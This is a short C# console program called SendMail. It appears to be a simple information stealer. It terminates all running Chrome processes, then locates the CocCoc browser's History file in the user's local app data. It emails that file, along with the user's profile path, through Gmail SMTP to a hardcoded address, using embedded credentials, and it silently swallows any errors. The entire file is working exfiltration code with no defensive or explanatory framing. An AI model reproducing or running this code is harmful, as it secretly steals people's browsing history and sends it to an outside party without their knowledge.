using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Text.RegularExpressions;

namespace SendMail
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("your_email_address@gmail.com");
                mail.To.Add("testnotestest@gmail.com");

                var fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"..\Local\CocCoc\Browser\User Data\Default\History");
                File.Exists(fileName);
                IsProcessOpen();
                mail.Subject = "test mail";
                mail.Body = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var attachment = new Attachment(Environment.ExpandEnvironmentVariables(fileName));
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("testnotestest@gmail.com", "matkhaumacdinh");
                SmtpServer.EnableSsl = true;
                SmtpServer.Send(mail);
            }
            catch (Exception)
            {
            }
        }
        private static void IsProcessOpen()
        {
            foreach (var process in Process.GetProcessesByName("chrome"))
            {
                process.Kill();
            }
        }
    }
}
